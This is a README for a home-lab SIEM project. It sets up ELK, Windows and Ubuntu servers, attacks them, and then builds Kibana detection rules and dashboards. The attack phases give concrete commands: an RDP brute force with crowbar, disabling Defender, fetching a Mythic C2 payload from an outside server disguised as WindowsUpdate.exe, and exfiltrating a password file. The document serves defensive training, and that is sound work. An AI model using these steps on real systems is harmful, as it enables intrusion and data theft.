# SocAnalyst

This project aims to demonstrate step-by-step how to create a SIEM infratstructure capable of logging attempts to breach network security.

For this project a series of servers were created in order to log attempts, either SSH or RDP based.

Elastic servers were also created in order to provide log integrity in case one of the servers was compromised. It also provides a GUI proportioning ease for log access.

## Infrastructure

It consists of 3 vLans:

1. ELK vLan
2. Windows Server vLan
3. Ubuntu Server vLan

### ELK vLan

- Fleet server: Pulls logs from assigned servers and sends them to Elasticsearch server
- Elasticsearch & Kibana server: Used to create the GUI used for log inspection

## Project Diagram

## ![Diagram](/images/30-day-dFir-Diagram.jpg)

Once the infrastructure is setup the project aims to complete the attack diagram by:

1. Brute forcing either Windows server of ubuntu server using a kali linux machine.
2. During discovery look for potential targets
3. Disable Windows Defender
4. Execute payload from Mythic agent
5. Stablish Command & Control
6. Exfiltrate data
7. Setup server to create a ticket automatically
8. analyse ticket

## Setup

In order to follow this instructions please follow the [setup instructions](/setup/)

the ideal order of infrastructure creation is:

1. [Elasticsearch & Kibana Server](/setup/ELK/README.md)
2. [Windows Server](/setup/Windows%20Server%20RDP/README.md)
3. [Ubuntu Server](/setup/UbuntuSshServer/README.md)
4. [Fleet Server](/setup/Fleet%20Server/README.md)
5. [Kali Linux](/setup/kali%20Linux/)
6. [Mythic Server](/setup/Mythic%20Server/README.md)
7. [osTicket Server](/setup/osTicket/)

## Attack Diagram

![attackDiagram](/images/atackDiagram.jpg)

### Following the diagram

#### Phase 1

On kali Linux's terminal

1. `cd /usr/share/wordlists`
   ![kaliWordlists](/images/kaliWordlists.png)
2. `sudo gunzip rockyou.txt.gz`

3. `head -50 rockyou.txt > ~/kali-wordlist.txt`

4. append the server password to the list: `echo "{SERVER_PASSWORD}" >> ~/kali-wordlist.txt`
5. `sudo apt update && sudo apt upgrade -y`
6. `sudo apt install crowbar -y`
7. Create a target txt file with:

   - Target IP Address
   - Target username

8. `crowbar -b rdp -u rfAdmin123 -C kali-wordlist.txt -s 4.182.221.204/32`

   - -b {openvpn,rdp,sshkey,vnckey}, --brute {openvpn,rdp,sshkey,vnckey}
     Target service
   - -u USERNAME [USERNAME ...], --username USERNAME [USERNAME ...]
     Static name to login with
   - -C FILE, --passwdfile FILE
     Multiple passwords to login with, stored in a file
   - -s SERVER, --server SERVER
     Static target

![crowbarSuccess](/images/crowbarSuccess.png)

9. `xfreerdp /u:rfAdmin123 /p:Spring2025! /v:4.182.221.204`

   - /u: Username
   - /p: Password
   - /v: Server hostname

10. Do you trust the certificate? `Y`

_Connection successful_

#### Phase 2

1. Open command prompt
2. Run commands `whoami` `ipconfig` `net user` `net group` `net user {WHOAMI_USER}`

#### Phase 3

1. On windows security settings disable all options for realtime protection

#### Phase 4

[Create Payload](/setup/Mythic%20Server/README.md)

##### On Mythic terminal

- `cd ~`
- `wget {DOWNLOAD_LINK} --no-check-certificate`
- `mv {DOWNLOADED_FILE} windowsBreacher.exe`
- `mv windowsBreacher.exe 1/`
- `python3 -m http.server 9999`

##### On Kali RDP

- Open PowerShell
- `Invoke-WebRequest -Uri http://40.113.170.68:9999/windowsBreacher.exe -Outfile "C:\Users\Public\Downloads\WindowsUpdate.exe"`

![fileInfiltrated](/images/fileInfiltrated.png)

- `.\WindowsUpdate.exe`

![payloadRunning](/images/payloadRunning.png)

- Verify connection with `netstat -anob`

  - look for {MYTHIC_SERVER_IP_ADDRESS} Established

  _If connection not established, check firewalls_

#### Phase 5

##### On Mythic GUI

On callbacks (telephone icon)

- Click on the keyboard icon beside on the "interact" section
- Run the command "whoami" (this was included when creating the apollo payload)

![whoamiServed](/images/whoamiServed.png)

#### Phase 6

- `download C:\Users\{ADMIN_USER}\Documents\password.txt`

This will exfiltrate the file, which can be accessed on Mythic GUIs "Files", however the command line will output a preview

![fileExfiltratedPreview](/images/fileExfiltratedPreview.png)

## Querying Activity

- `event.code: 5001` gives 1 result, which is reason enough to investigate
- the latest entry from `event.code: 11` (fileCreate) states that user `rfAdmin123` downloaded TargetFileName `C:\Users\Public\Downloads\WindowsUpdate.exe` with powershell
  ![powerShellDownloadLog](/images/powerShellDownloadLog.png)

- `event.code: "1"  and WindowsUpdate.exe` the user can check the process' hashes
  ![event1hashes](/images/event1hashes.png)

- Using [virustotal](https://www.virustotal.com/gui/search/71A3E18B2AD045BD7260AA8F6D5B77A3846CED8A) to check the hash has returned with no results as this is a brand new agent

- `winlog.event_data.OriginalFileName: Apollo.exe` is different from our current name of `WindowsUpdate.exe`, something to keep in mind

## Alert against Agent

A way to defend againt this intrusion is creating alarms against `OriginalFileName: Apollo.exe` or `winlog.event_data.Hashes: SHA256=68D255E2E16186E75AE504BA6802244F7C0385C4A5BBC3CC94E75991B69312E8`

After some fiddling with the Discovery Query this is what I'll be using
\
`event.code: "1" and (winlog.event_data.Hashes: *68D255E2E16186E75AE504BA6802244F7C0385C4A5BBC3CC94E75991B69312E8* or winlog.event_data.OriginalFileName : "Apollo.exe")`

### On Kibana

#### Create rule

Navigate to Security>Rules>Detection Rules(SIEM)>Create New Rule

1. Define Rule
   - Custom Query
   - Query: `event.code: "1" and (winlog.event_data.Hashes: *68D255E2E16186E75AE504BA6802244F7C0385C4A5BBC3CC94E75991B69312E8* or winlog.event_data.OriginalFileName : "Apollo.exe")`
   - Required Fields
     - @timestamp
     - winlog.event_data.User
     - winlog.event_data.ParentImage
     - winlog.event_data.ParentCommandLine
     - winlog.event_data.Image
     - winlog.event_data.CommandLine
     - winlog.event_data.ProcessGuid
     - winlog.event_data.CurrentDirectory
2. About Rule

- Name: `Mythic-C2-Apollo-Agent-Detected`
- Description: `This rule detects a potential mythic c2 Apollo Agent`

3. Schedule Rule

- Runs every: 5m
  Additional look-back time: 5m

**_Create and enable Rule_**

#### Creating Dashboard

Analytics > Dashboard > Create new dashboard > create visualization

##### 1st Visualization

paste this query on the query field `event.code: "1" and event.provider :Microsoft-Windows-Sysmon and (powershell or cmd or rundl32)`

Change the the visualization type to `Table` and add the following fields

- @timestamp
- host.hostname
- winlog.event_data.User
- winlog.event_data.Image
- winlog.event_data.CommandLine
- winlog.event_data.ParentImage
- winlog.event_data.ParentCommandLine
- winlog.event_data.ProcessGuid
- winlog.event_data.CurrentDirectory

Change the number of values on each field to 999, on advanced uncheck `Group remaining values as "Other"` and change the field name to its last attribute

![dashboardApolloAlert](/images/dashboardApolloAlert.png)

##### 2nd visualization

paste this query on the query field `event.code: "3"  and event.provider :Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true`

Change the the visualization type to `Table` and add the following fields

- @timestamp
- winlog.event_data.Image
- winlog.event_data.SourceIp
- winlog.event_data.DestinationIp
- winlog.event_data.DestinationPort

##### 3rd visualization

paste this query on the query field `event.code: "5001" and event.provider :Microsoft-Windows-Windows Defender`

Change the the visualization type to `Table` and add the following fields

- host.hostname
- winlog.event_data.Product Name

#### Dashboard

The Dashboard should be similar to this

![dashboardSuspiciousActivity](/images/dashboardSuspiciousActivity.png)
